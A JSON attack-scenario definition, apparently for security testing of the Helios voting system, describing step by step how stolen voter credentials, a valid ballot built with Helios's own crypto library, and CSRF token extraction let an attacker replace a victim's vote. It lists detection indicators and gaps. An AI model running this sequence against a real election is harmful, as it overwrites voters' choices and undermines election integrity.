@@ -1,0 +1,113 @@
+{
+  "attack_id": "ATK-BFULL-VOTECHANGE",
+  "attack_class": "vote_change_stolen_creds",
+  "vector": "system",
+  "name": "Підміна голосу вкраденими обліковими даними (валідний бюлетень)",
+  "complexity": "high",
+  "stride_category": "Tampering",
+  "mitre_tactic": "Impact",
+  "mitre_technique_id": "T1565.001",
+  "mitre_technique_name": "Stored Data Manipulation",
+  "linddun_category": "Nr",
+  "linddun_threat": "Non-repudiation / integrity of the cast ballot",
+  "linddun_impact": "Голос жертви замінено на вибір атакувальника",
+  "severity": "critical",
+  "target_component": "Helios /cast + /cast_confirm",
+  "description": "Найсильніша реальна атака на цілісність: атакувальник має ВКРАДЕНИЙ пароль виборця (фішинг/витік). Helios open-source, тож у нього є і клієнтська крипта. Він логіниться під жертвою, збирає КРИПТОГРАФІЧНО ВАЛІДНИЙ бюлетень (ElGamal + ZK-докази) крипто-бібліотекою самого Helios і подає його — vote_hash жертви змінюється. Це реальний ПІДТВЕРДЖЕНИЙ ущерб (не просто HTTP 200), і саме межа застосовності ЦІС: запит виглядає як легітимна автентифікована подача.",
+  "preconditions": "Вкрадений пароль виборця; виборчі заморожені (голосування відкрите).",
+  "voter_impact": "Голос жертви підмінено — прямий підрив цілісності виборів.",
+  "steps": [
+    {
+      "step": 1,
+      "phase": "Reconnaissance",
+      "action": "Публічна сторінка виборів (стан, public key, питання)",
+      "method": "GET",
+      "endpoint": "/helios/elections/{election_uuid}/view",
+      "expected_result": "HTTP 200/302 — сторінка виборів або редирект на логін",
+      "attacker_note": "Election public key потрібен для збірки валідного бюлетеня."
+    },
+    {
+      "step": 2,
+      "phase": "Credential Access",
+      "action": "Логін ВКРАДЕНИМИ обліковими даними виборця (election-scoped)",
+      "method": "POST",
+      "endpoint": "/helios/elections/{election_uuid}/password_voter_login",
+      "payload": {"voter_id": "{voter_id}", "password": "{password}", "return_url": ""},
+      "follow_redirects": false,
+      "expected_result": "302 + сесія виборця (CURRENT_VOTER_ID)",
+      "attacker_note": "Election-scoped вхід відкриває приватні вибори; не йдемо за 302 (він веде на SECURE_URL_HOST)."
+    },
+    {
+      "step": 3,
+      "phase": "Preparation",
+      "action": "Збірка КРИПТОГРАФІЧНО ВАЛІДНОГО бюлетеня кріптою Helios",
+      "method": "BUILD_BALLOT",
+      "choice": 1,
+      "store_as": "encrypted_vote",
+      "expected_result": "Валідний EncryptedVote JSON (self-verified) у контексті",
+      "attacker_note": "Реюз helios.crypto.electionalgs → бюлетень пройде верифікацію сервера."
+    },
+    {
+      "step": 4,
+      "phase": "Delivery",
+      "action": "Свіжий CSRF зі сторінки голосування",
+      "method": "GET",
+      "endpoint": "/helios/elections/{election_uuid}/view",
+      "expected_result": "HTTP 200 з csrfmiddlewaretoken",
+      "context_extract": {},
+      "attacker_note": "Django CSRF для POST /cast."
+    },
+    {
+      "step": 5,
+      "phase": "Exploitation",
+      "action": "Подача валідного бюлетеня (кладеться в сесію Helios)",
+      "method": "POST",
+      "endpoint": "/helios/elections/{election_uuid}/cast",
+      "payload": {"encrypted_vote": "{encrypted_vote}"},
+      "follow_redirects": false,
+      "expected_result": "302 → cast_confirm",
+      "attacker_note": "/cast зберігає encrypted_vote у сесії й редиректить на підтвердження."
+    },
+    {
+      "step": 6,
+      "phase": "Exploitation",
+      "action": "Сторінка підтвердження — дістаємо Helios csrf_token",
+      "method": "GET",
+      "endpoint": "/helios/elections/{election_uuid}/cast_confirm",
+      "expected_result": "HTTP 200 з прихованим полем csrf_token",
+      "context_extract": {},
+      "attacker_note": "check_csrf() у Helios порівнює POST csrf_token з session['csrf_token'] — беремо саме це поле, не csrfmiddlewaretoken."
+    },
+    {
+      "step": 7,
+      "phase": "Impact",
+      "action": "КОМІТ підміненого голосу",
+      "method": "POST",
+      "endpoint": "/helios/elections/{election_uuid}/cast_confirm",
+      "payload": {"csrf_token": "{helios_csrf}"},
+      "follow_redirects": false,
+      "expected_result": "302 → cast_done; vote_hash жертви ЗМІНЕНО (реальний ущерб)",
+      "attacker_note": "Тут відбувається CastVote.verify_and_store — голос жертви замінено."
+    },
+    {
+      "step": 8,
+      "phase": "Verification",
+      "action": "Читання дошки бюлетенів — фіксуємо новий vote_hash",
+      "method": "GET",
+      "endpoint": "/helios/elections/{election_uuid}/ballots/?limit=500",
+      "expected_result": "JSON зі списком поданих бюлетенів (новий/змінений vote_hash)",
+      "context_extract": {"vote_hash": "vote_hash"},
+      "attacker_note": "Порівняй з helios_ballot_count before/after — ground truth ущерба."
+    }
+  ],
+  "indicators_of_compromise": [
+    "Валідний CastVote від імені виборця з нової адреси/сесії",
+    "Зміна vote_hash виборця між знімками ballots/"
+  ],
+  "detection_gaps": [
+    "Запит криптографічно й процедурно валідний — поведінковий аналіз ЦІС не відрізняє його від легітимної подачі без додаткових сигналів (ліміт пере-голосувань, аномалія зміни голосу на рівні Helios)."
+  ],
+  "affected_cia": ["Integrity"],
+  "helios_vulns_exploited": ["Крадіжка облікових даних виборця; відсутність контролю пере-голосування/аномалії зміни голосу"],
+  "generated_at": "2026-09-17T00:00:00+00:00"
+}
